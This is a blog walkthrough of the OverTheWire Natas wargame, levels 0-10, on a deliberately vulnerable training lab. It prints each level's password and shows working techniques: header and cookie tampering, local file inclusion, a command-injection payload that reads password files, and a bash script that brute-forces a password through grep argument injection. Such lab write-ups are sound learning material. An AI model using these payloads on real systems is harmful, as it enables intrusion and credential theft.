<!DOCTYPE html>
<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="/css/highlight.min.css">
    <link rel="stylesheet" type="text/css" href="/css/style.css">
    
    
    <title>Taha Draidia | OverTheWire&amp;#58; Natas 0-10</title>
    <script src="/js/highlight.min.js"></script>
    <script> hljs.initHighlightingOnLoad(); </script>
</head><body>
        
        <div id="container" class="container">
<span class="home_button"><a href="/">Back to home</a></span>
<h2 class="note_title">
<a href="/posts/on-the-wire-natas-0-10/" rel="bookmark"
           title="Permalink to OverTheWire&amp;#58; Natas 0-10">OverTheWire&amp;#58; Natas 0-10</a></h2>


<div class="note_info">
        <div class="origin">
            <strong>Created by:</strong><a href="https://twitter.com/tahadraidia">@tahadraidia</a> || <a href="https://tahadraidia.com">tahadraidia.com</a> 
        </div>
		<br />

        <div class="published" title="2019-02-19 00:00:00 &#43;0000 UTC">
            <strong>Published:</strong> <time datetime="2019-02-19">Feb 19, 2019</time>
        </div>
		<br />

        <div class="tags" title="tags">
        	
        	<strong>Tags:</strong>
        	
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/cookies">Cookies</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/injection">Injection</a>
            
            
        </div>
</div>

<br>
<p>Preparing for OSCP, I&rsquo;ve been working through <a href="http://overthewire.org/wargames/natas/">OverTheWire - natas</a> and here is my walktrough for levels 0-10. Natas is a series of insecure webapps, which aim to teach the basics of web security.</p>
<p>The security topics covered in these levels include:</p>
<ul>
<li>Editing HTTP headers</li>
<li>Editing cookies</li>
<li>File inclusion vulnerabilities</li>
<li>Bruteforce techniques</li>
<li>Command injections</li>
</ul>
<h2 id="natas-0">Natas 0</h2>
<p>It says that we can find the password for the next level on the page, yet we don&rsquo;t see it, do we ? Right click anywhere on the page and view the page, you should notice a comment as below:</p>
<pre tabindex="0"><code>...
&lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;
...
</code></pre><h2 id="natas-1">Natas 1</h2>
<p>Same message but this time right clik was disabled we can bypass it using different methods:</p>
<ul>
<li>Disable Javascript on the page.</li>
<li>Use a proxy such as Burp Suite.</li>
<li>CTRL + U view page shortcut.</li>
<li>Use Curl.</li>
<li>&hellip;</li>
</ul>
<pre tabindex="0"><code>...
&lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt;
...
</code></pre><h2 id="natas-2">Natas 2</h2>
<p>It says there&rsquo;s nothing on this page, when we view the code source we see:</p>
<pre tabindex="0"><code>...
&lt;h1&gt;natas2&lt;/h1&gt;
&lt;div id=&quot;content&quot;&gt;
There is nothing on this page
&lt;img src=&quot;files/pixel.png&quot;&gt;
&lt;/div&gt;
...
</code></pre><p>There is an image <em>pixel.png</em> inside files directory, if we look at that directory we notice a file called users.txt:</p>
<pre tabindex="0"><code># username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
</code></pre><h2 id="natas-3">Natas 3</h2>
<p>Same message, we view source code we notice this comment:</p>
<pre tabindex="0"><code>&lt;!-- No more information leaks!! Not even Google will find it this time... --&gt;
</code></pre><p>Hmm, smells like we need to use Google Dork:</p>
<pre tabindex="0"><code>site:natas3.natas.labs.overthewire.org
</code></pre><p><img src="/images/overthewire_natas/natas3.png" alt="natas3"></p>
<p>Inside s3cr3t directory there&rsquo;s a users.txt file containing the password for the next level:</p>
<pre tabindex="0"><code>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
</code></pre><h2 id="natas-4">Natas 4</h2>
<p>It says Access disallowed. You are visiting from &quot;&quot; while authorized users should come only from &ldquo;<a href="http://natas5.natas.labs.overthewire.org/%22">http://natas5.natas.labs.overthewire.org/&quot;</a>. We can bypass this by sending <code>Referer HTTP HEADER</code> containing: <code>http://natas5.natas.labs.overthewire.org/</code>:</p>
<pre tabindex="0"><code> curl http://natas4.natas.labs.overthewire.org/ -H &quot;Referer: http://natas5.natas.labs.overthewire.org/&quot; -H &quot;Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va&quot;
</code></pre><p><img src="/images/overthewire_natas/natas4.png" alt="natas4"></p>
<p>Password: <code>iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</code></p>
<h2 id="natas-5">Natas 5</h2>
<p>Access disallowed. You are not logged in. It seems we&rsquo;re dealing with sessions, let&rsquo;s take a look at cookies:</p>
<p><img src="/images/overthewire_natas/natas5_0.png" alt="natas5"></p>
<p>As you can notice, we have a cookie called <code>loggedin</code> set to <code>0</code>, by setting it to <code>1</code> we should get logged in.</p>
<p><img src="/images/overthewire_natas/natas5_1.png" alt="natas5"></p>
<p>Password for natas 6: <code>aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</code></p>
<h2 id="natas-6">Natas 6</h2>
<p>This time we are facing a password form and we have access the source code by clicking on View source code link:</p>
<pre tabindex="0"><code>...
&lt;?

include &quot;includes/secret.inc&quot;;

    if(array_key_exists(&quot;submit&quot;, $_POST)) {
        if($secret == $_POST['secret']) {
        print &quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;;
    } else {
        print &quot;Wrong secret&quot;;
    }
    }
?&gt;

&lt;form method=post&gt;
Input secret: &lt;input name=secret&gt;&lt;br&gt;
&lt;input type=submit name=submit&gt;
&lt;/form&gt;
...
</code></pre><p>As you can see there is <code>secret.inc</code> file inside includes directory:</p>
<pre tabindex="0"><code>&lt;?
$secret = &quot;FOEIUWGHFEEUHOFUOIU&quot;;
?&gt;
</code></pre><p>By inserting above password we get the next level password: <code>7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</code></p>
<h2 id="natas-7">Natas 7</h2>
<p>We have two links home and about, we view the source code of the page:</p>
<pre tabindex="0"><code>...
&lt;body&gt;
&lt;h1&gt;natas7&lt;/h1&gt;
&lt;div id=&quot;content&quot;&gt;

&lt;a href=&quot;index.php?page=home&quot;&gt;Home&lt;/a&gt;
&lt;a href=&quot;index.php?page=about&quot;&gt;About&lt;/a&gt;
&lt;br&gt;
&lt;br&gt;

&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;
&lt;/div&gt;
&lt;/body&gt;
...
</code></pre><p>We got a hint, the password should be inside <code>/etc/natas_webpass/natas8</code> but how can we read this file ? if we look closely at the source code of the page we can notice this snippet: <code>index.php?page=home</code> it seems like <em>local file inclusion</em> vulnerability:</p>
<p><img src="/images/overthewire_natas/natas7.png" alt="natas7"></p>
<p>Password for the next leve: <code>DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</code></p>
<h2 id="natas-8">Natas 8</h2>
<p>I like this one, we have a form and we got access to it source code:</p>
<pre tabindex="0"><code>...
&lt;?

$encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;;

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists(&quot;submit&quot;, $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print &quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;;
    } else {
    print &quot;Wrong secret&quot;;
    }
}
?&gt;
...
</code></pre><p>We need to match <code>encodedSecret</code> variable and to do so we first need to revert the process of <code>encodeSecret</code>.</p>
<p>Here is what <code>encodeSecret</code> function does:</p>
<pre tabindex="0"><code>take user input (string) -&gt; base64 encode input -&gt; revert base64 encoded string -&gt; Returns an ASCII string containing the hexadecimal representation of string 
</code></pre><p>This is what we need to do:</p>
<pre tabindex="0"><code>take encodedSecret as input -&gt; hex2bin -&gt; revert string -&gt; base64 decode string 
</code></pre><p>POC:</p>
<p><img src="/images/overthewire_natas/natas8_0.png" alt="natas8"></p>
<p>Form&rsquo;s password: <code>oubWYf2kBq</code></p>
<p><img src="/images/overthewire_natas/natas8_1.png" alt="natas8"></p>
<p>Next level password: <code>W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</code></p>
<h2 id="natas-9">Natas 9</h2>
<p>This time we have a search and we have access to the source code:</p>
<pre tabindex="0"><code>...
&lt;?
$key = &quot;&quot;;

if(array_key_exists(&quot;needle&quot;, $_REQUEST)) {
    $key = $_REQUEST[&quot;needle&quot;];
}

if($key != &quot;&quot;) {
    passthru(&quot;grep -i $key dictionary.txt&quot;);
}
?&gt;
...
</code></pre><p>We have a classic command injection here, we control <code>$_REQUEST[&quot;needle&quot;]</code> and the developer didn&rsquo;t sanitize the user input before using it on <code>passthru</code> function which basicly execute an external program and display raw output. <a href="http://php.net/manual/en/function.passthru.php">passthru()</a> is similar to <a href="http://php.net/manual/en/function.exec.php">exec()</a> or <a href="http://php.net/manual/en/function.system.php">system()</a>.</p>
<p>As web know from earlier, passwords are stored in <code>/etc/natas_webpass/natasX</code> where <code>X</code> is the level number. By inserting <code>;cat /etc/natas_webpass/natas10</code> we break out from <code>grep -i</code> command and print out the natas10 password.</p>
<p><img src="/images/overthewire_natas/natas9_1.png" alt="natas9"></p>
<p>Next level password: <code>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</code></p>
<h2 id="natas-10">Natas 10</h2>
<p>Similar to the previous level but this time the developer filtered some characters using regex:</p>
<pre tabindex="0"><code>...
if(preg_match('/[;|&amp;]/',$key)) {
        print &quot;Input contains an illegal character!&quot;;
    } else {
        passthru(&quot;grep -i $key dictionary.txt&quot;);
    }
...
</code></pre><p>Unfortunately the last approach won&rsquo;t work here, we need to see this from a different angle, <code>$key</code>&rsquo;s value is reflected as a parameter to grep command, if we take a look at the man of grep:</p>
<p><img src="/images/overthewire_natas/natas10_00.png" alt="natas10"></p>
<p>In PHP code the grep command is invoked in this form:</p>
<pre tabindex="0"><code>grep [OPTIONS] PATTERN [FILE]
</code></pre><p>We already know that we control the <code>key</code> variable, we can use it to pass <code>PATTERN</code> and <code>FILE</code> parameter to <code>grep</code>. By brute forcing PATTERN parameter (looking for existent character in the password) and passing <code>/etc/natas_webpass/natas11</code> as FILE parameter we can obtain natas11&rsquo;s password.</p>
<p><img src="/images/overthewire_natas/natas10.png" alt="natas10"></p>
<p>We can do much better, let&rsquo;s append our injection with <code>%23</code> which is the url encoded value of <code>#</code>. In bash <code>#</code> is used for comments, so by inserting <code>#</code> at the end of the command we ignore <code>dictionary.txt</code> Hence, we got a clean output which make it easy for us to create a script to brute force.</p>
<pre tabindex="0"><code>#!/bin§bash

AUTH=&quot;Authorization: Basic bmF0YXMxMDpuT3BwMWlnUUFrVXphSTFHVVVqem4xYkZWajd4Q056dQ==&quot;

for fuzz in {a..z}
do
	content=`curl -s &quot;http://natas10.natas.labs.overthewire.org/?needle=$fuzz%20/etc/natas_webpass/natas11%20%23&amp;submit=Search&quot; -H &quot;$AUTH&quot;`
	password=$(echo &quot;$content&quot; | grep -A1 '&lt;pre&gt;' | tr -d '\n,&lt;pre&gt;,&lt;/pre&gt;' )
	if [ ! -z $password ] &amp;&amp; [[ &quot;$password&quot; =~ [a-zA-Z0-9]+ ]]
	then
		echo password found: $password
		exit 0
	fi
done
</code></pre><p>Output:</p>
<p><img src="/images/overthewire_natas/natas10_02.png" alt="natas10"></p>
<p>Manuel:</p>
<p><img src="/images/overthewire_natas/natas10_01.png" alt="natas10"></p>
<p>The password: <code>U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</code></p>
<p>Thanks for reading, Happy hacking.</p>

  <div class="contact">
    <h2>Contact</h2>
    Please feel free to ping me at <a href="https://twitter.com/tahadraidia">@tahadraidia</a>. Also you can see more of my work at <a href="https://tahadraidia.com">https://tahadraidia.com</a>.
</div>
</br> 
        </div>
        <script> hljs.initHighlightingOnLoad(); </script></body>
</html>
